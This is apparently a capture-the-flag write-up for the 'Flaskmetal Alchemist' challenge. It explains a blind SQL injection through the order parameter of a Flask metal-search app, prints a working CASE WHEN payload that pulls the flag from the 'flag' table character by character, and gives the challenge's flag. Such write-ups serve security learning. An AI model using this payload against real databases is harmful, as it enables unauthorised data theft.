## Flaskmetal Alchemist
> Edward has decided to get into web development, and he built this awesome application that lets you search for any metal you want. Alphonse has some reservations though, so he wants you to check it out and make sure it's legit.

Source: [fma.zip](fma.zip?raw=true)
App have a sql injection bugs (order by type) in module __Seach metals__, parameter _order_by_
![Alt text](fma.png?raw=true "Title")
With Table structure found in source code, (table name __flag__ and column name _flag_), i generate payload for exploit sqli:
```
search=Be&order=(case+when+(select+unicode(substr(flag,1,1))+from+flag)%3d102+then+atomic_number+else+name+end)
```
Exploit code in [exploit.py](exploit.py?raw=true)
Flag: `flag{order_by_blind}`